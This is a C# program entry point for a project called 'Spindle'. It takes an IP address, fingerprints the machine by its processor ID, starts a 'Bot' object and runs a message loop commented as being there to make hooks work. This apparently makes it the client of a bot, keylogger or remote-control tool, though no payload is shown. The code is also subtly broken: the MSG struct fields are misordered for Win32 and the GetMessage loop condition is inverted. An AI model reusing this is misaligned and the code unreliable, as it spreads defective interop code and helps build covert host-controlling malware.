using System;
using System.Runtime.InteropServices;

namespace Spindle {
    internal class Program {
        private static class NativeMethods {
            [Serializable]
            public struct MSG {
                public IntPtr hwnd;
                public IntPtr lParam;
                public int message;
                public int pt_x, pt_y;

                public int time;

                public IntPtr wParam;
            }

            [DllImport("user32.dll")]
            public static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

            [DllImport("user32.dll")]
            public static extern bool TranslateMessage([In] ref MSG lpMsg);

            [DllImport("user32.dll")]
            public static extern IntPtr DispatchMessage([In] ref MSG lpmsg);
        }

        private static void Main(string[] args) {
            Console.Write("enter ip: ");
            string ip = Console.ReadLine();
            if(String.IsNullOrEmpty(ip)) ip = "127.0.0.1";

            Console.WriteLine("ProcessorID = " + Util.GetObject("Win32_Processor", "ProcessorID"));
            Bot bot = new Bot(ip, Util.GetObject("Win32_Processor", "ProcessorID"));

            // windows message queue handling to make hooks work
            NativeMethods.MSG msg;
            while((!NativeMethods.GetMessage(out msg, IntPtr.Zero, 0, 0))) {
                NativeMethods.TranslateMessage(ref msg);
                NativeMethods.DispatchMessage(ref msg);
            }
        }
    }
}